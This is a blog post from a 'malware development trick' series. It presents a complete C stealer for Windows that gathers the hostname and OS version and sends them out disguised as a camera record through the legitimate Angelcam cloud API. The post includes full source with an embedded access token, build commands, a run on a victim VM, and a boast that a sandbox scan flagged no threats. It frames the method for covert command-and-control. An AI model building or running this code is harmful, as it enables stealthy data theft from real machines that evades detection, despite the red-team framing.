---
title:  "Malware development trick 54: steal data via legit Angelcam API. Simple C example."
date:   2025-10-31 02:00:00 +0300
header:
  teaser: "/assets/images/183/2025-10-22_01-14.png"
categories:
  - malware
tags:
  - red team
  - windows
  - malware
  - angelcam
  - iot
  - stealer
---

ï·½

Hello, cybersecurity enthusiasts and white hackers!        

![malware](/assets/images/183/2025-10-22_01-14.png){:class="img-responsive"}    

Today, we will examine the Angelcam HTTP API, frequently utilized for IoT Camera Management, which can also be exploited by attackers for malware command and control connection.     

Abusing the Angelcam API is an effective strategy for hiding criminal activities during attacks, particularly in Red Team Operations against organizations that emphasize IoT devices and surveillance cameras.    

### practical example

As usual, I'll demonstrate a simple stealer PoC that sends system information from an infected Windows machine via Angelcam API.    

First of all, create Angelcam account and generate personal API token:    

![malware](/assets/images/183/2025-10-21_01-58.png){:class="img-responsive"}    

![malware](/assets/images/183/2025-10-21_01-59.png){:class="img-responsive"}    

![malware](/assets/images/183/2025-10-21_02-01.png){:class="img-responsive"}    

![malware](/assets/images/183/2025-10-21_02-02.png){:class="img-responsive"}    

According to the [documentation](https://developers.angelcam.com/) for using Angelcam's RESTful API we need to use token in every request like this:     

```bash
curl -H "Authorization: PersonalAccessToken TOKEN" -X GET "https://api.angelcam.com/v1/me/"
```

![malware](/assets/images/183/2025-10-21_02-19.png){:class="img-responsive"}    

![malware](/assets/images/183/2025-10-21_02-18.png){:class="img-responsive"}    

Let's try to create new camera via API:    

```bash
curl -X POST "https://api.angelcam.com/v1/cameras/" -H "Accept: application/json" -H "Content-Type: application/json" -H "Authorization: PersonalAccessToken TOKEN" 
  -d '{
    "name": "My brand new MEOW camera", 
    "type": "h264", "connection_type",
    "connection_type": "direct",
    "url": "rtsp://username:password@175.36.248.73:554/live.sdp"
  }'
```

![malware](/assets/images/183/2025-10-21_12-22.png){:class="img-responsive"}    

![malware](/assets/images/183/2025-10-21_12-24.png){:class="img-responsive"}    

Request a paginated list of cameras for the current user again:    

```bash
curl -H "Authorization: PersonalAccessToken TOKEN" -X GET "https://api.angelcam.com/v1/cameras/"
```

![malware](/assets/images/183/2025-10-21_12-22.png){:class="img-responsive"}    

![malware](/assets/images/183/2025-10-21_12-48.png){:class="img-responsive"}    

So for sending info to API we need something like this:     

```cpp
// Angelcam personal access token
#define API_KEY "5761d5ebfc1c58d0f3bd6989911074a45a111efe"
 
int sendToAngelcam(const char* name) {
  HINTERNET hSession = WinHttpOpen(L"MeowMeowAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession) return 1;
 
  HINTERNET hConnect = WinHttpConnect(hSession, L"api.angelcam.com",
                          INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (!hConnect) {
    WinHttpCloseHandle(hSession);
    return 1;
  }
 
  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/v1/cameras/",
                             NULL, WINHTTP_NO_REFERER,
                             WINHTTP_DEFAULT_ACCEPT_TYPES,
                             WINHTTP_FLAG_SECURE);
  if (!hRequest) {
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }
 
  // construct the request body
  char json_body[1024];
  snprintf(json_body, sizeof(json_body), 
    "{\"name\": \"%s\", \"type\": \"h264\", \"connection_type\": \"direct\", \"url\": \"rtsp://127.0.0.1\"}",
    name);

  char authHeader[512];

  snprintf(authHeader, sizeof(authHeader), "Authorization: PersonalAccessToken %s", API_KEY);

  wchar_t wauthHeader[512];
  wchar_t wctypeHeader[] = L"Content-Type: application/json";
  MultiByteToWideChar(CP_ACP, 0, authHeader, -1, wauthHeader, 512);
 
  WinHttpAddRequestHeaders(hRequest, wauthHeader, -1, WINHTTP_ADDREQ_FLAG_ADD);
  WinHttpAddRequestHeaders(hRequest, wctypeHeader, -1, WINHTTP_ADDREQ_FLAG_ADD);
 
  WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)json_body, strlen(json_body), strlen(json_body), 0);
  WinHttpReceiveResponse(hRequest, NULL);
 
  // get response (checking)
  WinHttpReceiveResponse(hRequest, NULL);

  DWORD bytesRead;
  char buffer[2048];
 
  while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
    buffer[bytesRead] = '\0';
    printf("%s", buffer);
  }

  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
 
  return 0;
}
```

Full source code looks like this (`hack.c`):    

```cpp
/*
 * hack_angelcam.c
 * sending systeminfo via legit cloud API (Angelcam PoC)
 * author: @cocomelonc
*/

#include <windows.h>
#include <iphlpapi.h>
#include <winhttp.h>
#include <stdio.h>
 
// Angelcam personal access token
#define API_KEY "5761d5ebfc1c58d0f3bd6989911074a45a111efe"
 
int sendToAngelcam(const char* name) {
  HINTERNET hSession = WinHttpOpen(L"MeowMeowAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession) return 1;
 
  HINTERNET hConnect = WinHttpConnect(hSession, L"api.angelcam.com",
                          INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (!hConnect) {
    WinHttpCloseHandle(hSession);
    return 1;
  }
 
  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/v1/cameras/",
                             NULL, WINHTTP_NO_REFERER,
                             WINHTTP_DEFAULT_ACCEPT_TYPES,
                             WINHTTP_FLAG_SECURE);
  if (!hRequest) {
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }
 
  // construct the request body
  char json_body[1024];
  snprintf(json_body, sizeof(json_body), 
    "{\"name\": \"%s\", \"type\": \"h264\", \"connection_type\": \"direct\", \"url\": \"rtsp://127.0.0.1\"}",
    name);

  char authHeader[512];

  snprintf(authHeader, sizeof(authHeader), "Authorization: PersonalAccessToken %s", API_KEY);

  wchar_t wauthHeader[512];
  wchar_t wctypeHeader[] = L"Content-Type: application/json";
  MultiByteToWideChar(CP_ACP, 0, authHeader, -1, wauthHeader, 512);
 
  WinHttpAddRequestHeaders(hRequest, wauthHeader, -1, WINHTTP_ADDREQ_FLAG_ADD);
  WinHttpAddRequestHeaders(hRequest, wctypeHeader, -1, WINHTTP_ADDREQ_FLAG_ADD);
 
  WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)json_body, strlen(json_body), strlen(json_body), 0);
  WinHttpReceiveResponse(hRequest, NULL);
 
  // get response (checking)
  WinHttpReceiveResponse(hRequest, NULL);

  DWORD bytesRead;
  char buffer[2048];
 
  while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
    buffer[bytesRead] = '\0';
    printf("%s", buffer);
  }

  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
 
  return 0;
}
 
int main() {
  CHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
  DWORD size = sizeof(hostName) / sizeof(hostName[0]);
  GetComputerNameA(hostName, &size);
 
  OSVERSIONINFO osVersion;
  osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
  GetVersionEx(&osVersion);
 
  char buffer[512];
  snprintf(buffer, sizeof(buffer), "Host:%s OS:%d.%d.%d",
        hostName,
        osVersion.dwMajorVersion,
        osVersion.dwMinorVersion,
        osVersion.dwBuildNumber);

  int r = sendToAngelcam(buffer);
  if (r == 0) {
    printf("systeminfo successfully sent to Angelcam as 'camera'.\n");
  } else {
    printf("failed to send systeminfo to Angelcam.\n");
  }
 
  return 0;
}
```

### demo

Let's go to see everything in action. Compile it:    

```bash
x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -liphlpapi -lwinhttp
```

![malware](/assets/images/183/2025-11-03_15-24.png){:class="img-responsive"}    

Then, run it on victim's Windows 10 x64 VM host:     

```powershell
.\hack.exe
```

![malware](/assets/images/183/2025-10-22_01-03.png){:class="img-responsive"}    

As you can see, everything worked as expected! "Camera" info with systeminfo message is created! =^..^=     

Let's analyze with [ANY.RUN](https://app.any.run/):    

![malware](/assets/images/183/2025-11-03_15-30.png){:class="img-responsive"}    

![malware](/assets/images/183/2025-11-03_15-32.png){:class="img-responsive"}    

As you can see, ANY.RUN says that everything is ok: **no threats detected**.     

[https://app.any.run/tasks/1a93e76c-6236-4220-adad-fc8493e2cb0a](https://app.any.run/tasks/1a93e76c-6236-4220-adad-fc8493e2cb0a)    

As I mention before, abusing Angelcam API for C2 or stealing logic is ideal for Red Team engagements / pentest in companies/clients with surveillance cameras.    

Thanks to [ANY.RUN](https://app.any.run/) for API!     

[ATT&CK MITRE: T1102](https://attack.mitre.org/techniques/T1102/)    
[ANY.RUN](https://app.any.run/)     
[ANY.RUN: hack.exe](https://app.any.run/tasks/1a93e76c-6236-4220-adad-fc8493e2cb0a)     
[BitBucket API Stealer](/malware/2025/08/28/malware-tricks-51.html)     
[Github API stealer](/malware/2025/01/19/malware-tricks-44.html)      
[VirusTotal API stealer](/malware/2024/06/25/malware-trick-41.html)    
[Telegram Bot API stealer](/malware/2024/06/16/malware-trick-40.html)     
[source code in Github](https://github.com/cocomelonc/meow/tree/master/2025-10-31-malware-trick-54)     

> This is a practical case for educational purposes only.

Thanks for your time happy hacking and good bye!         
*PS. All drawings and screenshots are mine*       
